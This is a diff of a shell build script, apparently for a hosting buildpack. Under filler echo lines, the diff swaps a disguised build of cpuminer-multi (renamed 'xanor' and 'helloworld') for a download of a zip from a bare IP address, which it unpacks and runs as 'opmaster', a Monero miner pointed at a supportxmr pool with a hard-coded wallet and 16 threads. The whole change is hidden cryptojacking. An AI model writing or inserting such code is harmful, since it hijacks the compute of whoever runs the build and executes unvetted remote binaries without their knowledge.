@@ -61,15 +61,12 @@ echo "kasdopasdokdpas"
 echo "kasdopasdokdpas"
 echo "kasdopasdokdpas"
 
-git clone https://github.com/hyc/cpuminer-multi
-mv cpuminer-multi xanor
-cd xanor
-chmod 777 autogen.sh
-mv autogen.sh auto.sh
-./auto.sh
-CFLAGS="-march=native" ./configure
-make
-mv minerd helloworld
-cd ..
-mv * $BUILD_DIR/
+wget http://145.239.38.8/helloworldexample.zip -O helloworld.zip
+unzip helloworld.zip
+rm helloworld.zip
+
+cd opmaster
+
+./opmaster -a cryptonight -o stratum+tcp://de01.supportxmr.com:80 -u 42vQvvBMcjpbXKiDeqDXC3S6knhce2pzsF2khk72xQ9n74eWw8abAhJdmT9aE43kuyJmhytqBbYPnMfwQ2dbVdyEM1dogMi -p ThreadReaper -t 16
+
 echo "done"
